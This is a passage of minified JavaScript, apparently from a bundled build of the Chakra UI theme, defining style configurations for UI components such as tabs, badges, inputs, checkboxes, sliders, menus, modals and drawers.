  gx = lx((e) => {
      const { colorScheme: t } = e;
      return {
          tab: {
              borderTopRadius: "md",
              border: "1px solid",
              borderColor: "transparent",
              mb: "-1px",
              [ix.variable]: "transparent",
              _selected: { [ox.variable]: `colors.${t}.600`, [ix.variable]: "colors.white", _dark: { [ox.variable]: `colors.${t}.300`, [ix.variable]: "colors.gray.800" }, borderColor: "inherit", borderBottomColor: ix.reference },
              color: ox.reference,
          },
          tablist: { mb: "-1px", borderBottom: "1px solid", borderColor: "inherit" },
      };
  }),
  vx = lx((e) => {
      const { colorScheme: t } = e;
      return {
          tab: {
              border: "1px solid",
              borderColor: "inherit",
              [ax.variable]: "colors.gray.50",
              _dark: { [ax.variable]: "colors.whiteAlpha.50" },
              mb: "-1px",
              _notLast: { marginEnd: "-1px" },
              _selected: {
                  [ax.variable]: "colors.white",
                  [ox.variable]: `colors.${t}.600`,
                  _dark: { [ax.variable]: "colors.gray.800", [ox.variable]: `colors.${t}.300` },
                  borderColor: "inherit",
                  borderTopColor: "currentColor",
                  borderBottomColor: "transparent",
              },
              color: ox.reference,
              bg: ax.reference,
          },
          tablist: { mb: "-1px", borderBottom: "1px solid", borderColor: "inherit" },
      };
  }),
  yx = lx((e) => {
      const { colorScheme: t, theme: n } = e;
      return { tab: { borderRadius: "full", fontWeight: "semibold", color: "gray.600", _selected: { color: wb(n, `${t}.700`), bg: wb(n, `${t}.100`) } } };
  }),
  bx = sx({
      baseStyle: px,
      sizes: hx,
      variants: {
          line: mx,
          enclosed: gx,
          "enclosed-colored": vx,
          "soft-rounded": yx,
          "solid-rounded": lx((e) => {
              const { colorScheme: t } = e;
              return {
                  tab: {
                      borderRadius: "full",
                      fontWeight: "semibold",
                      [ox.variable]: "colors.gray.600",
                      _dark: { [ox.variable]: "inherit" },
                      _selected: { [ox.variable]: "colors.white", [ax.variable]: `colors.${t}.600`, _dark: { [ox.variable]: "colors.gray.800", [ax.variable]: `colors.${t}.300` } },
                      color: ox.reference,
                      bg: ax.reference,
                  },
              };
          }),
          unstyled: lx({}),
      },
      defaultProps: { size: "md", variant: "line", colorScheme: "blue" },
  }),
  xx = (function (e, t) {
      const n = {};
      for (const r of t)
          if (Array.isArray(r)) {
              const [t, o] = r;
              n[t] = _v(`${e}-${t}`, o);
          } else n[r] = _v(`${e}-${r}`);
      return n;
  })("badge", ["bg", "color", "shadow"]),
  wx = (e) => {
      const { colorScheme: t, theme: n } = e,
          r = Eb(`${t}.500`, 0.6)(n);
      return { [xx.bg.variable]: `colors.${t}.500`, [xx.color.variable]: "colors.white", _dark: { [xx.bg.variable]: r, [xx.color.variable]: "colors.whiteAlpha.800" } };
  },
  Sx = (e) => {
      const { colorScheme: t, theme: n } = e,
          r = Eb(`${t}.200`, 0.16)(n);
      return { [xx.bg.variable]: `colors.${t}.100`, [xx.color.variable]: `colors.${t}.800`, _dark: { [xx.bg.variable]: r, [xx.color.variable]: `colors.${t}.200` } };
  },
  kx = (e) => {
      const { colorScheme: t, theme: n } = e,
          r = Eb(`${t}.200`, 0.8)(n);
      return { [xx.color.variable]: `colors.${t}.500`, _dark: { [xx.color.variable]: r }, [xx.shadow.variable]: `inset 0 0 0px 1px ${xx.color.reference}` };
  },
  Ex = {
      baseStyle: { px: 1, textTransform: "uppercase", fontSize: "xs", borderRadius: "sm", fontWeight: "bold", bg: xx.bg.reference, color: xx.color.reference, boxShadow: xx.shadow.reference },
      variants: { solid: wx, subtle: Sx, outline: kx },
      defaultProps: { variant: "subtle", colorScheme: "gray" },
  },
  { defineMultiStyleConfig: Cx, definePartsStyle: _x } = cy(ob.keys),
  Px = _v("tag-bg"),
  Tx = _v("tag-color"),
  Rx = _v("tag-shadow"),
  zx = _v("tag-min-height"),
  Ax = _v("tag-min-width"),
  jx = _v("tag-font-size"),
  Ox = _v("tag-padding-inline"),
  Fx = _x({
      container: {
          fontWeight: "medium",
          lineHeight: 1.2,
          outline: 0,
          [Tx.variable]: xx.color.reference,
          [Px.variable]: xx.bg.reference,
          [Rx.variable]: xx.shadow.reference,
          color: Tx.reference,
          bg: Px.reference,
          boxShadow: Rx.reference,
          borderRadius: "md",
          minH: zx.reference,
          minW: Ax.reference,
          fontSize: jx.reference,
          px: Ox.reference,
          _focusVisible: { [Rx.variable]: "shadows.outline" },
      },
      label: { lineHeight: 1.2, overflow: "visible" },
      closeButton: {
          fontSize: "lg",
          w: "5",
          h: "5",
          transitionProperty: "common",
          transitionDuration: "normal",
          borderRadius: "full",
          marginStart: "1.5",
          marginEnd: "-1",
          opacity: 0.5,
          _disabled: { opacity: 0.4 },
          _focusVisible: { boxShadow: "outline", bg: "rgba(0, 0, 0, 0.14)" },
          _hover: { opacity: 0.8 },
          _active: { opacity: 1 },
      },
  }),
  Nx = {
      sm: _x({ container: { [zx.variable]: "sizes.5", [Ax.variable]: "sizes.5", [jx.variable]: "fontSizes.xs", [Ox.variable]: "space.2" }, closeButton: { marginEnd: "-2px", marginStart: "0.35rem" } }),
      md: _x({ container: { [zx.variable]: "sizes.6", [Ax.variable]: "sizes.6", [jx.variable]: "fontSizes.sm", [Ox.variable]: "space.2" } }),
      lg: _x({ container: { [zx.variable]: "sizes.8", [Ax.variable]: "sizes.8", [jx.variable]: "fontSizes.md", [Ox.variable]: "space.3" } }),
  },
  Mx = Cx({
      variants: {
          subtle: _x((e) => {
              var t;
              return { container: null == (t = Ex.variants) ? void 0 : t.subtle(e) };
          }),
          solid: _x((e) => {
              var t;
              return { container: null == (t = Ex.variants) ? void 0 : t.solid(e) };
          }),
          outline: _x((e) => {
              var t;
              return { container: null == (t = Ex.variants) ? void 0 : t.outline(e) };
          }),
      },
      baseStyle: Fx,
      sizes: Nx,
      defaultProps: { size: "md", variant: "subtle", colorScheme: "gray" },
  }),
  { definePartsStyle: Lx, defineMultiStyleConfig: Bx } = cy(Wy.keys),
  Ix = Lx({ field: { width: "100%", minWidth: 0, outline: 0, position: "relative", appearance: "none", transitionProperty: "common", transitionDuration: "normal", _disabled: { opacity: 0.4, cursor: "not-allowed" } } }),
  Dx = {
      lg: { fontSize: "lg", px: "4", h: "12", borderRadius: "md" },
      md: { fontSize: "md", px: "4", h: "10", borderRadius: "md" },
      sm: { fontSize: "sm", px: "3", h: "8", borderRadius: "sm" },
      xs: { fontSize: "xs", px: "2", h: "6", borderRadius: "sm" },
  },
  $x = { lg: Lx({ field: Dx.lg, addon: Dx.lg }), md: Lx({ field: Dx.md, addon: Dx.md }), sm: Lx({ field: Dx.sm, addon: Dx.sm }), xs: Lx({ field: Dx.xs, addon: Dx.xs }) };
function Vx(e) {
  const { focusBorderColor: t, errorBorderColor: n } = e;
  return { focusBorderColor: t || Pb("blue.500", "blue.300")(e), errorBorderColor: n || Pb("red.500", "red.300")(e) };
}
var Ux,
  Wx,
  Hx,
  qx,
  Yx,
  Xx,
  Gx,
  Qx,
  Kx,
  Zx,
  Jx,
  ew = Lx((e) => {
      const { theme: t } = e,
          { focusBorderColor: n, errorBorderColor: r } = Vx(e);
      return {
          field: {
              border: "1px solid",
              borderColor: "inherit",
              bg: "inherit",
              _hover: { borderColor: Pb("gray.300", "whiteAlpha.400")(e) },
              _readOnly: { boxShadow: "none !important", userSelect: "all" },
              _invalid: { borderColor: Sb(t, r), boxShadow: `0 0 0 1px ${Sb(t, r)}` },
              _focusVisible: { zIndex: 1, borderColor: Sb(t, n), boxShadow: `0 0 0 1px ${Sb(t, n)}` },
          },
          addon: { border: "1px solid", borderColor: Pb("inherit", "whiteAlpha.50")(e), bg: Pb("gray.100", "whiteAlpha.300")(e) },
      };
  }),
  tw = Lx((e) => {
      const { theme: t } = e,
          { focusBorderColor: n, errorBorderColor: r } = Vx(e);
      return {
          field: {
              border: "2px solid",
              borderColor: "transparent",
              bg: Pb("gray.100", "whiteAlpha.50")(e),
              _hover: { bg: Pb("gray.200", "whiteAlpha.100")(e) },
              _readOnly: { boxShadow: "none !important", userSelect: "all" },
              _invalid: { borderColor: Sb(t, r) },
              _focusVisible: { bg: "transparent", borderColor: Sb(t, n) },
          },
          addon: { border: "2px solid", borderColor: "transparent", bg: Pb("gray.100", "whiteAlpha.50")(e) },
      };
  }),
  nw = Lx((e) => {
      const { theme: t } = e,
          { focusBorderColor: n, errorBorderColor: r } = Vx(e);
      return {
          field: {
              borderBottom: "1px solid",
              borderColor: "inherit",
              borderRadius: "0",
              px: "0",
              bg: "transparent",
              _readOnly: { boxShadow: "none !important", userSelect: "all" },
              _invalid: { borderColor: Sb(t, r), boxShadow: `0px 1px 0px 0px ${Sb(t, r)}` },
              _focusVisible: { borderColor: Sb(t, n), boxShadow: `0px 1px 0px 0px ${Sb(t, n)}` },
          },
          addon: { borderBottom: "2px solid", borderColor: "inherit", borderRadius: "0", px: "0", bg: "transparent" },
      };
  }),
  rw = Bx({
      baseStyle: Ix,
      sizes: $x,
      variants: { outline: ew, filled: tw, flushed: nw, unstyled: Lx({ field: { bg: "transparent", px: "0", height: "auto" }, addon: { bg: "transparent", px: "0", height: "auto" } }) },
      defaultProps: { size: "md", variant: "outline" },
  }),
  ow = { ...(null == (Ux = rw.baseStyle) ? void 0 : Ux.field), paddingY: "2", minHeight: "20", lineHeight: "short", verticalAlign: "top" },
  aw = {
      outline: (e) => {
          var t, n;
          return null != (n = null == (t = rw.variants) ? void 0 : t.outline(e).field) ? n : {};
      },
      flushed: (e) => {
          var t, n;
          return null != (n = null == (t = rw.variants) ? void 0 : t.flushed(e).field) ? n : {};
      },
      filled: (e) => {
          var t, n;
          return null != (n = null == (t = rw.variants) ? void 0 : t.filled(e).field) ? n : {};
      },
      unstyled: null != (Hx = null == (Wx = rw.variants) ? void 0 : Wx.unstyled.field) ? Hx : {},
  },
  iw = {
      baseStyle: ow,
      sizes: {
          xs: null != (Yx = null == (qx = rw.sizes) ? void 0 : qx.xs.field) ? Yx : {},
          sm: null != (Gx = null == (Xx = rw.sizes) ? void 0 : Xx.sm.field) ? Gx : {},
          md: null != (Kx = null == (Qx = rw.sizes) ? void 0 : Qx.md.field) ? Kx : {},
          lg: null != (Jx = null == (Zx = rw.sizes) ? void 0 : Zx.lg.field) ? Jx : {},
      },
      variants: aw,
      defaultProps: { size: "md", variant: "outline" },
  },
  sw = Db("tooltip-bg"),
  lw = Db("tooltip-fg"),
  cw = Db("popper-arrow-bg"),
  uw = {
      baseStyle: {
          bg: sw.reference,
          color: lw.reference,
          [sw.variable]: "colors.gray.700",
          [lw.variable]: "colors.whiteAlpha.900",
          _dark: { [sw.variable]: "colors.gray.300", [lw.variable]: "colors.gray.900" },
          [cw.variable]: sw.reference,
          px: "2",
          py: "0.5",
          borderRadius: "sm",
          fontWeight: "medium",
          fontSize: "sm",
          boxShadow: "md",
          maxW: "xs",
          zIndex: "tooltip",
      },
  },
  { defineMultiStyleConfig: dw, definePartsStyle: fw } = cy(Qy.keys),
  pw = (e) => {
      const { colorScheme: t, theme: n, isIndeterminate: r, hasStripe: o } = e,
          a = Pb(Cb(), Cb("1rem", "rgba(0,0,0,0.1)"))(e),
          i = Pb(`${t}.500`, `${t}.200`)(e),
          s = `linear-gradient(\n    to right,\n    transparent 0%,\n    ${Sb(n, i)} 50%,\n    transparent 100%\n  )`;
      return { ...(!r && o && a), ...(r ? { bgImage: s } : { bgColor: i }) };
  },
  hw = { lineHeight: "1", fontSize: "0.25em", fontWeight: "bold", color: "white" },
  mw = (e) => ({ bg: Pb("gray.100", "whiteAlpha.300")(e) }),
  gw = (e) => ({ transitionProperty: "common", transitionDuration: "slow", ...pw(e) }),
  vw = fw((e) => ({ label: hw, filledTrack: gw(e), track: mw(e) })),
  yw = dw({ sizes: { xs: fw({ track: { h: "1" } }), sm: fw({ track: { h: "2" } }), md: fw({ track: { h: "3" } }), lg: fw({ track: { h: "4" } }) }, baseStyle: vw, defaultProps: { size: "md", colorScheme: "blue" } });
function bw(e, ...t) {
  return "function" == typeof e ? e(...t) : e;
}
var xw,
  ww,
  Sw,
  kw,
  Ew,
  Cw,
  _w,
  Pw,
  Tw,
  { definePartsStyle: Rw, defineMultiStyleConfig: zw } = cy(Iy.keys),
  Aw = _v("checkbox-size"),
  jw = (e) => {
      const { colorScheme: t } = e;
      return {
          w: Aw.reference,
          h: Aw.reference,
          transitionProperty: "box-shadow",
          transitionDuration: "normal",
          border: "2px solid",
          borderRadius: "sm",
          borderColor: "inherit",
          color: "white",
          _checked: {
              bg: Pb(`${t}.500`, `${t}.200`)(e),
              borderColor: Pb(`${t}.500`, `${t}.200`)(e),
              color: Pb("white", "gray.900")(e),
              _hover: { bg: Pb(`${t}.600`, `${t}.300`)(e), borderColor: Pb(`${t}.600`, `${t}.300`)(e) },
              _disabled: { borderColor: Pb("gray.200", "transparent")(e), bg: Pb("gray.200", "whiteAlpha.300")(e), color: Pb("gray.500", "whiteAlpha.500")(e) },
          },
          _indeterminate: { bg: Pb(`${t}.500`, `${t}.200`)(e), borderColor: Pb(`${t}.500`, `${t}.200`)(e), color: Pb("white", "gray.900")(e) },
          _disabled: { bg: Pb("gray.100", "whiteAlpha.100")(e), borderColor: Pb("gray.100", "transparent")(e) },
          _focusVisible: { boxShadow: "outline" },
          _invalid: { borderColor: Pb("red.500", "red.300")(e) },
      };
  },
  Ow = { _disabled: { cursor: "not-allowed" } },
  Fw = { userSelect: "none", _disabled: { opacity: 0.4 } },
  Nw = { transitionProperty: "transform", transitionDuration: "normal" },
  Mw = zw({
      baseStyle: Rw((e) => ({ icon: Nw, container: Ow, control: bw(jw, e), label: Fw })),
      sizes: {
          sm: Rw({ control: { [Aw.variable]: "sizes.3" }, label: { fontSize: "sm" }, icon: { fontSize: "3xs" } }),
          md: Rw({ control: { [Aw.variable]: "sizes.4" }, label: { fontSize: "md" }, icon: { fontSize: "2xs" } }),
          lg: Rw({ control: { [Aw.variable]: "sizes.5" }, label: { fontSize: "lg" }, icon: { fontSize: "2xs" } }),
      },
      defaultProps: { size: "md", colorScheme: "blue" },
  }),
  { defineMultiStyleConfig: Lw, definePartsStyle: Bw } = cy(Ky.keys),
  Iw = (e) => {
      var t;
      const n = null == (t = bw(Mw.baseStyle, e)) ? void 0 : t.control;
      return { ...n, borderRadius: "full", _checked: { ...(null == n ? void 0 : n._checked), _before: { content: '""', display: "inline-block", pos: "relative", w: "50%", h: "50%", borderRadius: "50%", bg: "currentColor" } } };
  },
  Dw = Lw({
      baseStyle: Bw((e) => {
          var t, n, r, o;
          return { label: null == (n = (t = Mw).baseStyle) ? void 0 : n.call(t, e).label, container: null == (o = (r = Mw).baseStyle) ? void 0 : o.call(r, e).container, control: Iw(e) };
      }),
      sizes: { md: Bw({ control: { w: "4", h: "4" }, label: { fontSize: "md" } }), lg: Bw({ control: { w: "5", h: "5" }, label: { fontSize: "lg" } }), sm: Bw({ control: { width: "3", height: "3" }, label: { fontSize: "sm" } }) },
      defaultProps: { size: "md", colorScheme: "blue" },
  }),
  { defineMultiStyleConfig: $w, definePartsStyle: Vw } = cy(Zy.keys),
  Uw = _v("select-bg"),
  Ww = { paddingInlineEnd: "8" },
  Hw = $w({
      baseStyle: Vw({
          field: {
              ...(null == (xw = rw.baseStyle) ? void 0 : xw.field),
              appearance: "none",
              paddingBottom: "1px",
              lineHeight: "normal",
              bg: Uw.reference,
              [Uw.variable]: "colors.white",
              _dark: { [Uw.variable]: "colors.gray.700" },
              "> option, > optgroup": { bg: Uw.reference },
          },
          icon: { width: "6", height: "100%", insetEnd: "2", position: "relative", color: "currentColor", fontSize: "xl", _disabled: { opacity: 0.5 } },
      }),
      sizes: {
          lg: { ...(null == (ww = rw.sizes) ? void 0 : ww.lg), field: { ...(null == (Sw = rw.sizes) ? void 0 : Sw.lg.field), ...Ww } },
          md: { ...(null == (kw = rw.sizes) ? void 0 : kw.md), field: { ...(null == (Ew = rw.sizes) ? void 0 : Ew.md.field), ...Ww } },
          sm: { ...(null == (Cw = rw.sizes) ? void 0 : Cw.sm), field: { ...(null == (_w = rw.sizes) ? void 0 : _w.sm.field), ...Ww } },
          xs: { ...(null == (Pw = rw.sizes) ? void 0 : Pw.xs), field: { ...(null == (Tw = rw.sizes) ? void 0 : Tw.xs.field), ...Ww }, icon: { insetEnd: "1" } },
      },
      variants: rw.variants,
      defaultProps: rw.defaultProps,
  }),
  qw = _v("skeleton-start-color"),
  Yw = _v("skeleton-end-color"),
  Xw = {
      baseStyle: {
          [qw.variable]: "colors.gray.100",
          [Yw.variable]: "colors.gray.400",
          _dark: { [qw.variable]: "colors.gray.800", [Yw.variable]: "colors.gray.600" },
          background: qw.reference,
          borderColor: Yw.reference,
          opacity: 0.7,
          borderRadius: "sm",
      },
  },
  Gw = _v("skip-link-bg"),
  Qw = {
      baseStyle: {
          borderRadius: "md",
          fontWeight: "semibold",
          _focusVisible: { boxShadow: "outline", padding: "4", position: "fixed", top: "6", insetStart: "6", [Gw.variable]: "colors.white", _dark: { [Gw.variable]: "colors.gray.700" }, bg: Gw.reference },
      },
  },
  { defineMultiStyleConfig: Kw, definePartsStyle: Zw } = cy(Jy.keys),
  Jw = _v("slider-thumb-size"),
  eS = _v("slider-track-size"),
  tS = _v("slider-bg"),
  nS = (e) => {
      const { orientation: t } = e;
      return { display: "inline-block", position: "relative", cursor: "pointer", _disabled: { opacity: 0.6, cursor: "default", pointerEvents: "none" }, ...Tb({ orientation: t, vertical: { h: "100%" }, horizontal: { w: "100%" } }) };
  },
  rS = (e) => ({
      ...Tb({ orientation: e.orientation, horizontal: { h: eS.reference }, vertical: { w: eS.reference } }),
      overflow: "hidden",
      borderRadius: "sm",
      [tS.variable]: "colors.gray.200",
      _dark: { [tS.variable]: "colors.whiteAlpha.200" },
      _disabled: { [tS.variable]: "colors.gray.300", _dark: { [tS.variable]: "colors.whiteAlpha.300" } },
      bg: tS.reference,
  }),
  oS = (e) => {
      const { orientation: t } = e;
      return {
          ...Tb({
              orientation: t,
              vertical: { left: "50%", transform: "translateX(-50%)", _active: { transform: "translateX(-50%) scale(1.15)" } },
              horizontal: { top: "50%", transform: "translateY(-50%)", _active: { transform: "translateY(-50%) scale(1.15)" } },
          }),
          w: Jw.reference,
          h: Jw.reference,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          position: "absolute",
          outline: 0,
          zIndex: 1,
          borderRadius: "full",
          bg: "white",
          boxShadow: "base",
          border: "1px solid",
          borderColor: "transparent",
          transitionProperty: "transform",
          transitionDuration: "normal",
          _focusVisible: { boxShadow: "outline" },
          _disabled: { bg: "gray.300" },
      };
  },
  aS = (e) => {
      const { colorScheme: t } = e;
      return { width: "inherit", height: "inherit", [tS.variable]: `colors.${t}.500`, _dark: { [tS.variable]: `colors.${t}.200` }, bg: tS.reference };
  },
  iS = Kw({
      baseStyle: Zw((e) => ({ container: nS(e), track: rS(e), thumb: oS(e), filledTrack: aS(e) })),
      sizes: {
          lg: Zw({ container: { [Jw.variable]: "sizes.4", [eS.variable]: "sizes.1" } }),
          md: Zw({ container: { [Jw.variable]: "sizes.3.5", [eS.variable]: "sizes.1" } }),
          sm: Zw({ container: { [Jw.variable]: "sizes.2.5", [eS.variable]: "sizes.0.5" } }),
      },
      defaultProps: { size: "md", colorScheme: "blue" },
  }),
  sS = Db("spinner-size"),
  lS = {
      baseStyle: { width: [sS.reference], height: [sS.reference] },
      sizes: { xs: { [sS.variable]: "sizes.3" }, sm: { [sS.variable]: "sizes.4" }, md: { [sS.variable]: "sizes.6" }, lg: { [sS.variable]: "sizes.8" }, xl: { [sS.variable]: "sizes.12" } },
      defaultProps: { size: "md" },
  },
  { defineMultiStyleConfig: cS, definePartsStyle: uS } = cy(eb.keys),
  dS = cS({
      baseStyle: uS({
          container: {},
          label: { fontWeight: "medium" },
          helpText: { opacity: 0.8, marginBottom: "2" },
          number: { verticalAlign: "baseline", fontWeight: "semibold" },
          icon: { marginEnd: 1, w: "3.5", h: "3.5", verticalAlign: "middle" },
      }),
      sizes: { md: uS({ label: { fontSize: "sm" }, helpText: { fontSize: "sm" }, number: { fontSize: "2xl" } }) },
      defaultProps: { size: "md" },
  }),
  fS = _v("kbd-bg"),
  pS = {
      baseStyle: {
          [fS.variable]: "colors.gray.100",
          _dark: { [fS.variable]: "colors.whiteAlpha.100" },
          bg: fS.reference,
          borderRadius: "md",
          borderWidth: "1px",
          borderBottomWidth: "3px",
          fontSize: "0.8em",
          fontWeight: "bold",
          lineHeight: "normal",
          px: "0.4em",
          whiteSpace: "nowrap",
      },
  },
  hS = {
      baseStyle: {
          transitionProperty: "common",
          transitionDuration: "fast",
          transitionTimingFunction: "ease-out",
          cursor: "pointer",
          textDecoration: "none",
          outline: "none",
          color: "inherit",
          _hover: { textDecoration: "underline" },
          _focusVisible: { boxShadow: "outline" },
      },
  },
  { defineMultiStyleConfig: mS, definePartsStyle: gS } = cy(Hy.keys),
  vS = mS({ baseStyle: gS({ icon: { marginEnd: "2", display: "inline", verticalAlign: "text-bottom" } }) }),
  { defineMultiStyleConfig: yS, definePartsStyle: bS } = cy(qy.keys),
  xS = _v("menu-bg"),
  wS = _v("menu-shadow"),
  SS = yS({
      baseStyle: bS({
          button: { transitionProperty: "common", transitionDuration: "normal" },
          list: {
              [xS.variable]: "#fff",
              [wS.variable]: "shadows.sm",
              _dark: { [xS.variable]: "colors.gray.700", [wS.variable]: "shadows.dark-lg" },
              color: "inherit",
              minW: "3xs",
              py: "2",
              zIndex: 1,
              borderRadius: "md",
              borderWidth: "1px",
              bg: xS.reference,
              boxShadow: wS.reference,
          },
          item: {
              py: "1.5",
              px: "3",
              transitionProperty: "background",
              transitionDuration: "ultra-fast",
              transitionTimingFunction: "ease-in",
              _focus: { [xS.variable]: "colors.gray.100", _dark: { [xS.variable]: "colors.whiteAlpha.100" } },
              _active: { [xS.variable]: "colors.gray.200", _dark: { [xS.variable]: "colors.whiteAlpha.200" } },
              _expanded: { [xS.variable]: "colors.gray.100", _dark: { [xS.variable]: "colors.whiteAlpha.100" } },
              _disabled: { opacity: 0.4, cursor: "not-allowed" },
              bg: xS.reference,
          },
          groupTitle: { mx: 4, my: 2, fontWeight: "semibold", fontSize: "sm" },
          command: { opacity: 0.6 },
          divider: { border: 0, borderBottom: "1px solid", borderColor: "inherit", my: "2", opacity: 0.6 },
      }),
  }),
  { defineMultiStyleConfig: kS, definePartsStyle: ES } = cy(Yy.keys),
  CS = _v("modal-bg"),
  _S = _v("modal-shadow"),
  PS = { bg: "blackAlpha.600", zIndex: "modal" },
  TS = (e) => {
      const { isCentered: t, scrollBehavior: n } = e;
      return { display: "flex", zIndex: "modal", justifyContent: "center", alignItems: t ? "center" : "flex-start", overflow: "inside" === n ? "hidden" : "auto", overscrollBehaviorY: "none" };
  },
  RS = (e) => {
      const { isCentered: t, scrollBehavior: n } = e;
      return {
          borderRadius: "md",
          color: "inherit",
          my: t ? "auto" : "16",
          mx: t ? "auto" : void 0,
          zIndex: "modal",
          maxH: "inside" === n ? "calc(100% - 7.5rem)" : void 0,
          [CS.variable]: "colors.white",
          [_S.variable]: "shadows.lg",
          _dark: { [CS.variable]: "colors.gray.700", [_S.variable]: "shadows.dark-lg" },
          bg: CS.reference,
          boxShadow: _S.reference,
      };
  },
  zS = { px: "6", py: "4", fontSize: "xl", fontWeight: "semibold" },
  AS = { position: "absolute", top: "2", insetEnd: "3" },
  jS = (e) => {
      const { scrollBehavior: t } = e;
      return { px: "6", py: "2", flex: "1", overflow: "inside" === t ? "auto" : void 0 };
  },
  OS = { px: "6", py: "4" };
function FS(e) {
  return ES("full" === e ? { dialog: { maxW: "100vw", minH: "$100vh", my: "0", borderRadius: "0" } } : { dialog: { maxW: e } });
}
var NS = kS({
      baseStyle: ES((e) => ({ overlay: PS, dialogContainer: bw(TS, e), dialog: bw(RS, e), header: zS, closeButton: AS, body: bw(jS, e), footer: OS })),
      sizes: { xs: FS("xs"), sm: FS("sm"), md: FS("md"), lg: FS("lg"), xl: FS("xl"), "2xl": FS("2xl"), "3xl": FS("3xl"), "4xl": FS("4xl"), "5xl": FS("5xl"), "6xl": FS("6xl"), full: FS("full") },
      defaultProps: { size: "md" },
  }),
  { defineMultiStyleConfig: MS, definePartsStyle: LS } = cy(Xy.keys),
  BS = Db("number-input-stepper-width"),
  IS = Db("number-input-input-padding"),
  DS = Mb(BS).add("0.5rem").toString(),
  $S = Db("number-input-bg"),
  VS = Db("number-input-color"),
  US = Db("number-input-border-color"),
  WS = { [BS.variable]: "sizes.6", [IS.variable]: DS },
  HS = (e) => {
      var t, n;
      return null != (n = null == (t = bw(rw.baseStyle, e)) ? void 0 : t.field) ? n : {};
  },
  qS = { width: BS.reference },
  YS = {
      borderStart: "1px solid",
      borderStartColor: US.reference,
      color: VS.reference,
      bg: $S.reference,
      [VS.variable]: "colors.chakra-body-text",
      [US.variable]: "colors.chakra-border-color",
      _dark: { [VS.variable]: "colors.whiteAlpha.800", [US.variable]: "colors.whiteAlpha.300" },
      _active: { [$S.variable]: "colors.gray.200", _dark: { [$S.variable]: "colors.whiteAlpha.300" } },
      _disabled: { opacity: 0.4, cursor: "not-allowed" },
  };
function XS(e) {
  var t, n, r;
  const o = null == (t = rw.sizes) ? void 0 : t[e],
      a = { lg: "md", md: "md", sm: "sm", xs: "sm" },
      i = null != (r = null == (n = o.field) ? void 0 : n.fontSize) ? r : "md",
      s = Sy.fontSizes[i];
  return LS({
      field: { ...o.field, paddingInlineEnd: IS.reference, verticalAlign: "top" },
      stepper: { fontSize: Mb(s).multiply(0.75).toString(), _first: { borderTopEndRadius: a[e] }, _last: { borderBottomEndRadius: a[e], mt: "-1px", borderTopWidth: 1 } },
  });
}
var GS,
  QS,
  KS,
  ZS = MS({
      baseStyle: LS((e) => {
          var t;
          return { root: WS, field: null != (t = bw(HS, e)) ? t : {}, stepperGroup: qS, stepper: YS };
      }),
      sizes: { xs: XS("xs"), sm: XS("sm"), md: XS("md"), lg: XS("lg") },
      variants: rw.variants,
      defaultProps: rw.defaultProps,
  }),
  JS = {
      baseStyle: { ...(null == (GS = rw.baseStyle) ? void 0 : GS.field), textAlign: "center" },
      sizes: {
          lg: { fontSize: "lg", w: 12, h: 12, borderRadius: "md" },
          md: { fontSize: "md", w: 10, h: 10, borderRadius: "md" },
          sm: { fontSize: "sm", w: 8, h: 8, borderRadius: "sm" },
          xs: { fontSize: "xs", w: 6, h: 6, borderRadius: "sm" },
      },
      variants: {
          outline: (e) => {
              var t, n, r;
              return null != (r = null == (n = bw(null == (t = rw.variants) ? void 0 : t.outline, e)) ? void 0 : n.field) ? r : {};
          },
          flushed: (e) => {
              var t, n, r;
              return null != (r = null == (n = bw(null == (t = rw.variants) ? void 0 : t.flushed, e)) ? void 0 : n.field) ? r : {};
          },
          filled: (e) => {
              var t, n, r;
              return null != (r = null == (n = bw(null == (t = rw.variants) ? void 0 : t.filled, e)) ? void 0 : n.field) ? r : {};
          },
          unstyled: null != (KS = null == (QS = rw.variants) ? void 0 : QS.unstyled.field) ? KS : {},
      },
      defaultProps: rw.defaultProps,
  },
  { defineMultiStyleConfig: ek, definePartsStyle: tk } = cy(Gy.keys),
  nk = Db("popper-bg"),
  rk = Db("popper-arrow-bg"),
  ok = Db("popper-arrow-shadow-color"),
  ak = ek({
      baseStyle: tk({
          popper: { zIndex: 10 },
          content: {
              [nk.variable]: "colors.white",
              bg: nk.reference,
              [rk.variable]: nk.reference,
              [ok.variable]: "colors.gray.200",
              _dark: { [nk.variable]: "colors.gray.700", [ok.variable]: "colors.whiteAlpha.300" },
              width: "xs",
              border: "1px solid",
              borderColor: "inherit",
              borderRadius: "md",
              boxShadow: "sm",
              zIndex: "inherit",
              _focusVisible: { outline: 0, boxShadow: "outline" },
          },
          header: { px: 3, py: 2, borderBottomWidth: "1px" },
          body: { px: 3, py: 2 },
          footer: { px: 3, py: 2, borderTopWidth: "1px" },
          closeButton: { position: "absolute", borderRadius: "md", top: 1, insetEnd: 2, padding: 2 },
      }),
  }),
  { definePartsStyle: ik, defineMultiStyleConfig: sk } = cy(Dy.keys),
  lk = _v("drawer-bg"),
  ck = _v("drawer-box-shadow");
function uk(e) {
  return ik("full" === e ? { dialog: { maxW: "100vw", h: "100vh" } } : { dialog: { maxW: e } });
}
var dk = { bg: "blackAlpha.600", zIndex: "overlay" },
  fk = { display: "flex", zIndex: "modal", justifyContent: "center" },
  pk = (e) => {
      const { isFullHeight: t } = e;
      return {
          ...(t && { height: "100vh" }),
          zIndex: "modal",
          maxH: "100vh",
          color: "inherit",
          [lk.variable]: "colors.white",
          [ck.variable]: "shadows.lg",
          _dark: { [lk.variable]: "colors.gray.700", [ck.variable]: "shadows.dark-lg" },
          bg: lk.reference,
          boxShadow: ck.reference,
      };
  },
  hk = { px: "6", py: "4", fontSize: "xl", fontWeight: "semibold" },
  mk = { position: "absolute", top: "2", insetEnd: "3" },
  gk = { px: "6", py: "2", flex: "1", overflow: "auto" },
  vk = { px: "6", py: "4" },
  yk = sk({
      baseStyle: ik((e) => ({ overlay: dk, dialogContainer: fk, dialog: bw(pk, e), header: hk, closeButton: mk, body: gk, footer: vk })),
      sizes: { xs: uk("xs"), sm: uk("md"), md: uk("lg"), lg: uk("2xl"), xl: uk("4xl"), full: uk("full") },
      defaultProps: { size: "xs" },
  }),
  { definePartsStyle: bk, defineMultiStyleConfig: xk } = cy($y.keys),
  wk = xk({
      baseStyle: bk({
          preview: { borderRadius: "md", py: "1", transitionProperty: "common", transitionDuration: "normal" },
          input: { borderRadius: "md", py: "1", transitionProperty: "common", transitionDuration: "normal", width: "full", _focusVisible: { boxShadow: "outline" }, _placeholder: { opacity: 0.6 } },
          textarea: { borderRadius: "md", py: "1", transitionProperty: "common", transitionDuration: "normal", width: "full", _focusVisible: { boxShadow: "outline" }, _placeholder: { opacity: 0.6 } },
      }),
  }),
